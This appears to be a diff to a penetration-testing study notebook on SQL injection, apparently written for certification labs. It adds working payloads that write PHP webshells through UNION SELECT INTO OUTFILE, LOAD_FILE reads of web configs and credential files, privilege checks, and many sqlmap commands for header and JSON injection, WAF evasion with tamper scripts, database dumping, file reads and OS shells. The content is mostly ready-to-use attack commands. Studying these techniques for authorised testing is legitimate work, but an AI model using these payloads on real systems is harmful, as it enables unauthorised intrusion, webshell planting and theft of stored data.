@@ -250,6 +250,32 @@ offsec' OR 1=1 -- //
 -- MySQL webshell write via UNION + INTO OUTFILE
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 
+-- Shorter webshell variant (fewer URL-encoding issues, uses PHP backtick exec shorthand)
+-- <?= is short echo tag, `$_GET[0]` runs param "0" as a shell command and echoes output
+-- Usage: /shell.php?0=id
+' UNION SELECT "","<?=`\$_GET[0]`?>","","" INTO OUTFILE "/var/www/html/shell.php" -- //
+
+-- Finding the web root to target with INTO OUTFILE (read web server config via LOAD_FILE):
+-- Nginx:  LOAD_FILE("/etc/nginx/sites-enabled/default")  → look for "root <path>;"
+-- Apache: LOAD_FILE("/etc/apache2/sites-enabled/000-default.conf")  → look for "DocumentRoot <path>"
+-- Also try: LOAD_FILE("/var/www/html/index.php") or LOAD_FILE("/var/www/html/config.php")
+--           to find PHP includes and config files (DB creds often live in config.php)
+
+-- FILE privilege and write access checks (in-band UNION variant, when results render on page)
+-- Step 1: super admin check
+' UNION SELECT 1,super_priv,3,4 FROM mysql.user-- -
+-- "Y" = YES, has super privileges
+
+-- Step 2: list all privileges for current user
+' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges-- -
+-- Look for FILE in the privilege_type column
+
+-- Step 3: check secure_file_priv (empty = can read/write anywhere; NULL = can't read/write)
+' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
+
+-- Step 4: read a file (source code, config, /etc/passwd)
+' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4-- -
+
 -- Error-based extraction via extractvalue() (MySQL), works even on injection points where
 -- nothing is reflected (e.g. an INSERT statement), as long as DB errors reach the response
 ' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
@@ -327,7 +353,122 @@ sqlmap -u "http://<target>/wp-admin/admin-ajax.php?action=<name>&id=1" -p id --b
 
 See [[SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2]] and [[SQL Injection Attacks#🏆 Capstone Labs|the Capstone Labs section]] for the WordPress AJAX example.
 
-#### Tags: #Sqlmap
+### Sqlmap — Advanced Injection Points
+
+```bash
+# * injection marker: explicitly marks the injection point when sqlmap can't auto-detect it
+# Use in URLs, cookie headers, custom headers — anywhere the param isn't a standard GET/POST field
+
+# Cookie header injection
+sqlmap -u 'http://<target>/page.php' -H 'Cookie: id=*' --batch --dump
+
+# URL injection at a specific position (not the last param)
+sqlmap -u 'http://<target>/page.php?id=*&other=value' --batch --dump
+
+# Custom header injection (e.g. X-Forwarded-For)
+sqlmap -u 'http://<target>/page.php' -H 'X-Forwarded-For: *' --batch
+
+# JSON body injection — save full HTTP request to a file (Burp: right-click → Save item)
+# sqlmap auto-detects JSON content type and tests the values inside
+sqlmap -r request.req --batch --dump
+```
+
+### Sqlmap — Attack Tuning
+
+```bash
+# --level and --risk: push harder when default detection misses the injection
+# Default: --level 1 --risk 1
+# Max:     --level 5 --risk 3 (--risk 3 adds OR-based payloads that can modify data — avoid on production)
+sqlmap -u 'http://<target>/page.php?id=*' --level 5 --risk 3 --batch --dump
+
+# --prefix: close a non-standard bracket/function wrapping before the injection payload
+# Use when a single quote causes an error but standard payloads still fail
+# (inspect the error message to figure out what structure precedes your input)
+sqlmap -u 'http://<target>/page.php?col=id' --prefix='`)' --batch --dump
+
+# --union-cols: tell sqlmap the exact column count when auto-detection gets it wrong
+sqlmap -u 'http://<target>/page.php?id=1' --technique=U --union-cols=5 --batch --dump
+# --union-char=a          use 'a' instead of NULL for filler columns
+# --union-from=<table>    use a different FROM clause (if FROM DUAL causes errors)
+```
+
+### Sqlmap — WAF and Protection Bypass
+
+```bash
+# --random-agent: rotate User-Agent string per request (pulls from real-browser UA database)
+# Cheap, should be default for any WAF-protected target
+sqlmap -u 'http://<target>/page.php?id=1' --random-agent --batch --dump
+
+# --csrf-token: auto-refresh an anti-CSRF token before each request
+# Include the current token value in --data; sqlmap re-fetches and substitutes it automatically
+sqlmap -u 'http://<target>/form.php' \
+       --data 'id=1&csrf_token=<current_token_value>' \
+       --csrf-token=csrf_token \
+       --batch --dump
+
+# --randomize: generate a fresh random value for a specific parameter each request
+# Use when the app rejects repeated values (e.g. a transaction UID that must be unique per call)
+sqlmap -u 'http://<target>/page.php?id=1&uid=<current_value>' --randomize=uid --batch --dump
+
+# --tamper: post-process payloads through a Python script to bypass keyword/character filters
+sqlmap -u 'http://<target>/page.php?id=1' --tamper=between --batch --dump
+
+# Chaining tamper scripts
+sqlmap -u 'http://<target>/page.php?id=1' --tamper=between,space2comment,randomcase --batch --dump
+
+# List all available tamper scripts
+ls /usr/share/sqlmap/tamper/
+```
+
+**Useful tamper scripts:**
+| Script | What it transforms |
+|--------|-------------------|
+| `between` | Replaces `>` with `BETWEEN x AND y+1`, handles `=` same way |
+| `space2comment` | Replaces spaces with `/**/` |
+| `randomcase` | Randomizes keyword case (`SELECT` → `sElEcT`) |
+| `charencode` | URL-encodes non-standard characters |
+| `apostrophemask` | Replaces `'` with its unicode full-width equivalent |
+| `base64encode` | Base64-encodes the payload (only works if app decodes it server-side) |
+
+### Sqlmap — Enumeration
+
+```bash
+# Target a specific database and table (critical for time-based blind — don't dump everything)
+sqlmap -u 'http://<target>/page.php?id=1' -D <dbname> -T <tablename> --batch --dump
+
+# Enumerate databases, then tables, then columns before dumping
+sqlmap -u 'http://<target>/page.php?id=1' --dbs --batch
+sqlmap -u 'http://<target>/page.php?id=1' -D <dbname> --tables --batch
+sqlmap -u 'http://<target>/page.php?id=1' -D <dbname> -T <tablename> --columns --batch
+
+# Search for columns/tables/databases by keyword (searches across all accessible databases)
+sqlmap -u 'http://<target>/page.php?id=1' --search -C <keyword>   # search column names
+sqlmap -u 'http://<target>/page.php?id=1' --search -T <keyword>   # search table names
+sqlmap -u 'http://<target>/page.php?id=1' --search -D <keyword>   # search database names
+```
+
+**sqlmap output directory**, all dumps and file reads are saved to:
+```
+~/.local/share/sqlmap/output/<target_host>/dump/<dbname>/<tablename>.csv
+~/.local/share/sqlmap/output/<target_host>/files/_var_www_html_flag.txt  (/ replaced with _)
+```
+Check this directory when dump content doesn't appear in the terminal. Use `ls ~/.local/share/sqlmap/output/` to see what's been captured.
+
+### Sqlmap — OS Exploitation
+
+```bash
+# Read an arbitrary file (requires FILE privilege and secure_file_priv='' or matching path)
+sqlmap -u "http://<target>/page.php?id=1" --file-read "/var/www/html/flag.txt" --batch
+# Output saved to: ~/.local/share/sqlmap/output/<host>/files/_var_www_html_flag.txt
+
+# OS shell — error-based is faster than time-blind for the file-write upload
+# --technique=E avoids waiting for SLEEP() delays during the stager write
+sqlmap -u 'http://<target>/page.php?id=1' --os-shell --technique=E --batch
+# If it can't find a writable web root automatically:
+sqlmap -u 'http://<target>/page.php?id=1' --os-shell --technique=E --web-root "/var/www/html" --batch
+```
+
+#### Tags: #Sqlmap #CookieInjection #JSONInjection #WAFBypass #CSRFToken #Tamper #RandomAgent #FileRead #OSShell #AdvancedSqlmap
 
 ---
 
